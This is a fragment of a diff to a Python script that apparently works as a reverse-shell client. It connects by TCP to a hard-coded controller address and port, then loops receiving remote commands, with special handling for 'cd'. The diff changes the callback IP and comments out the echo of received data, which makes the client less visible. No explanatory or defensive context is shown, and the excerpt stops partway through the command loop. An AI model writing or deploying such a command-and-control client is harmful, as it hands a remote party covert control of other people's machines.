@@ -5,13 +5,13 @@ import os
 import re
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "192.168.1.4"
+host = "10.1.254.98"
 port = 1234
 s.connect((host, port))
 
 while True:
     data = s.recv(1024).decode()
-    print(data)
+    #print(data)
     try:    
         if data[:2] == "cd":
             res = data[3:]
